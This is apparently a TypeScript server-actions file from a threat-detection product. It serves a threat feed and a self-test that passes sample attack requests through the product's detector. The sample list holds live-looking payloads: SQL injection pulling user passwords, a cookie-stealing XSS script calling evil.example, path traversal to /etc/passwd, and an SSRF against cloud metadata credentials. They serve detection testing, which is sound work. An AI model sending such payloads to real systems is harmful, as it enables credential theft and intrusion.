'use server';

import { revalidatePath } from 'next/cache';

import {
  authPressureBySource,
  deleteSampleThreatEvents,
  listThreatEvents,
  recordThreatEvents,
  threatTotals,
  topThreatSources,
  topThreatTargets,
  type ThreatEventInput,
} from '@scanlyfix/db';
import { detectThreats, SEVERITY_BY_KIND, type ThreatKind } from '@scanlyfix/runtime-sdk';

import { getViewer } from '@/lib/authz';
import { hasThreatAccess } from '@/lib/entitlements';
import { AUTH_WINDOW_MINUTES, WINDOW_HOURS } from '@/lib/runtime/threats/labels';
import { bruteForceFindings, type BruteForceFinding } from '@/lib/runtime/threats/view';

export type ActionResult<T> = { ok: true; data: T } | { ok: false; error: string };

class NotFoundError extends Error {}

async function assertAccess(projectId: string): Promise<void> {
  const viewer = await getViewer();
  if (viewer.kind !== 'user') throw new NotFoundError();
  if (!(await hasThreatAccess(viewer, projectId))) throw new NotFoundError();
}

/**
 * Turns a thrown error into something the customer can read.
 *
 * The real error is logged and never returned: a driver message can carry table
 * names, and a "project not found" that distinguishes "does not exist" from
 * "not yours" is an account enumeration oracle.
 */
function toError(scope: string, err: unknown, fallback: string): string {
  if (err instanceof NotFoundError) return 'That project could not be found.';
  console.error(`[threats/${scope}]`, err);
  return fallback;
}

export type ThreatFeedRow = {
  id: string;
  kind: string;
  severity: string;
  confidence: string;
  surface: string;
  method: string;
  pattern: string;
  evidence: string;
  sourceIp: string | null;
  userAgent: string | null;
  blocked: boolean;
  responseStatus: number | null;
  source: string;
  detectedAt: string;
};

export type ThreatSnapshot = {
  events: ThreatFeedRow[];
  totals: { critical: number; high: number; medium: number; blocked: number; total: number };
  sources: Array<{ sourceIp: string; count: number; kinds: number; blocked: number; lastSeen: string }>;
  targets: Array<{ key: string; count: number }>;
  bruteForce: Array<Omit<BruteForceFinding, 'firstSeen' | 'lastSeen'> & { firstSeen: string; lastSeen: string }>;
  /** Server clock at the time of the read, so the client polls from a consistent point. */
  takenAt: string;
};

const serialiseRow = (r: Awaited<ReturnType<typeof listThreatEvents>>[number]): ThreatFeedRow => ({
  id: r.id,
  kind: r.kind,
  severity: r.severity,
  confidence: r.confidence,
  surface: r.surface,
  method: r.method,
  pattern: r.pattern,
  evidence: r.evidence,
  sourceIp: r.sourceIp,
  userAgent: r.userAgent,
  blocked: r.blocked,
  responseStatus: r.responseStatus,
  source: r.source,
  detectedAt: r.detectedAt.toISOString(),
});

/** Everything the console renders, read in one round of queries. */
export async function readThreatSnapshot(projectId: string, limit = 60): Promise<ThreatSnapshot> {
  const now = new Date();
  const since = new Date(now.getTime() - WINDOW_HOURS * 3_600_000);
  const authSince = new Date(now.getTime() - AUTH_WINDOW_MINUTES * 60_000);

  const [events, totals, sources, targets, pressure] = await Promise.all([
    listThreatEvents(projectId, { limit, since }),
    threatTotals(projectId, since),
    topThreatSources(projectId, since),
    topThreatTargets(projectId, since),
    authPressureBySource(projectId, authSince),
  ]);

  return {
    events: events.map(serialiseRow),
    totals,
    sources: sources.map((s) => ({
      sourceIp: s.sourceIp,
      count: s.count,
      kinds: s.kinds,
      blocked: s.blocked,
      lastSeen: new Date(s.lastSeen).toISOString(),
    })),
    targets: targets.map((t) => ({ key: t.key, count: t.count })),
    bruteForce: bruteForceFindings(pressure).map((f) => ({
      ...f,
      firstSeen: f.firstSeen.toISOString(),
      lastSeen: f.lastSeen.toISOString(),
    })),
    takenAt: now.toISOString(),
  };
}

/** What the console polls. Returns the whole snapshot, which is small and always consistent. */
export async function refreshThreatsAction(projectId: string): Promise<ActionResult<ThreatSnapshot>> {
  try {
    await assertAccess(projectId);
    return { ok: true, data: await readThreatSnapshot(projectId) };
  } catch (err) {
    return { ok: false, error: toError('refresh', err, 'The feed could not be refreshed.') };
  }
}

/**
 * Requests that a real attacker would send, used to prove the chain works.
 *
 * These are run through the SAME detector the SDK runs, rather than written
 * into the table as canned rows. That distinction is the whole point: if a rule
 * stops matching, this button stops producing that row, and the demo fails in
 * exactly the way the product would. A fixture would keep looking healthy.
 */
const SAMPLE_REQUESTS: ReadonlyArray<{
  pathname: string;
  search?: string;
  userAgent?: string;
  method: string;
  ip: string;
}> = [
  {
    pathname: '/api/products',
    search: "?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
    method: 'GET',
    ip: '203.0.113.42',
    userAgent: 'sqlmap/1.7.2#stable (http://sqlmap.org)',
  },
  {
    pathname: '/search',
    search: '?q=%3Cscript%3Efetch(%22https://evil.example/%22%2Bdocument.cookie)%3C/script%3E',
    method: 'GET',
    ip: '198.51.100.17',
  },
  {
    pathname: '/api/files',
    search: '?name=../../../../etc/passwd',
    method: 'GET',
    ip: '203.0.113.42',
  },
  { pathname: '/.env', method: 'GET', ip: '192.0.2.88' },
  { pathname: '/wp-login.php', method: 'POST', ip: '192.0.2.88' },
  {
    pathname: '/api/fetch',
    search: '?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    method: 'GET',
    ip: '198.51.100.17',
  },
];

export async function sendTestAttackAction(projectId: string): Promise<ActionResult<{ recorded: number }>> {
  try {
    await assertAccess(projectId);

    const rows: ThreatEventInput[] = [];
    for (const sample of SAMPLE_REQUESTS) {
      const matches = detectThreats({
        pathname: sample.pathname,
        search: sample.search,
        userAgent: sample.userAgent,
      });
      for (const match of matches) {
        rows.push({
          kind: match.kind,
          severity: SEVERITY_BY_KIND[match.kind as ThreatKind],
          confidence: match.confidence,
          ruleId: match.ruleId,
          surface: match.surface,
          method: sample.method,
          pattern: sample.pathname,
          evidence: match.evidence,
          sourceIp: sample.ip,
          userAgent: sample.userAgent ?? 'Mozilla/5.0 (compatible; ScanlyFix-SelfTest/1.0)',
          blocked: false,
          responseStatus: 404,
          eventCount: 1,
          // Marked, so it can be told apart from a real detection and removed
          // in one click. A demo that cannot be cleaned up is a demo that ends
          // up being read as an incident six months later.
          source: 'sample',
        });
      }
    }

    if (rows.length === 0) {
      return {
        ok: false,
        error: 'The detector recognised none of the sample attacks, which means something is wrong with it. Please report this.',
      };
    }

    const recorded = await recordThreatEvents(projectId, rows);
    revalidatePath('/threats');
    return { ok: true, data: { recorded } };
  } catch (err) {
    return { ok: false, error: toError('sample', err, 'The test attacks could not be recorded.') };
  }
}

export async function clearTestAttacksAction(projectId: string): Promise<ActionResult<{ removed: number }>> {
  try {
    await assertAccess(projectId);
    const removed = await deleteSampleThreatEvents(projectId);
    revalidatePath('/threats');
    return { ok: true, data: { removed } };
  } catch (err) {
    return { ok: false, error: toError('clear', err, 'The test attacks could not be removed.') };
  }
}
